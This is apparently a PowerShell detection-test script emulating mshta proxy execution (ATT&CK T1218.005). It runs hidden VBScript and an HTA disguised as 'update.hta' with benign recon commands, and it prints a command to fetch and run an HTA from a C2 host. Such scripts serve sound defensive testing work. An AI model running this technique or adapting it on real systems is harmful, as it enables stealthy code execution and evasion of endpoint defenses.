$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting LOLBin Execution - mshta..." -ForegroundColor Cyan

# T1218.005 - Mshta
# mshta.exe can execute HTA files and inline VBScript/JScript payloads

Write-Host "[*] [T1218.005] mshta execution - Signed Binary Proxy Execution" -ForegroundColor Yellow
Write-Host "[!] C2 Server: http://$C2Host/" -ForegroundColor Yellow

# Create local HTA payload
$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Method 1: Inline VBScript via mshta
Write-Host "`n[*] [T1218.005] Executing inline VBScript payload via mshta..."
Write-Host "    CMD: mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -c hostname"""", 0:close"")"
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -c hostname > $stagingDir\mshta_output.txt"", 0:close")
Start-Sleep -Seconds 2
if (Test-Path "$stagingDir\mshta_output.txt") {
    $output = Get-Content "$stagingDir\mshta_output.txt"
    Write-Host "    [+] mshta VBScript execution successful: $output" -ForegroundColor Green
}

# Method 2: Create and execute local HTA file
Write-Host "`n[*] Creating HTA payload file..."
$htaContent = @"
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -c whoami > C:\temp\staging\hta_whoami.txt", 0
    self.close
</script>
</head>
</html>
"@
$htaContent | Out-File "$stagingDir\update.hta" -Encoding ASCII
Write-Host "    [+] HTA payload created: $stagingDir\update.hta"

Write-Host "`n[*] Executing HTA payload..."
Write-Host "    CMD: mshta $stagingDir\update.hta"
Start-Process mshta "$stagingDir\update.hta" -Wait -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
if (Test-Path "$stagingDir\hta_whoami.txt") {
    $output = Get-Content "$stagingDir\hta_whoami.txt"
    Write-Host "    [+] HTA execution successful: $output" -ForegroundColor Green
}

# Method 3: Remote HTA from C2 (if available)
Write-Host "`n[*] [T1218.005] Attempting remote HTA execution from C2..."
Write-Host "    CMD: mshta http://$C2Host/tools/payload.hta"
Write-Host "    [!] This would download and execute an HTA from the C2 server" -ForegroundColor Yellow

Write-Host "`n[+] LOLBin Execution (mshta) Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: mshta.exe spawning powershell.exe, VBScript execution" -ForegroundColor Yellow
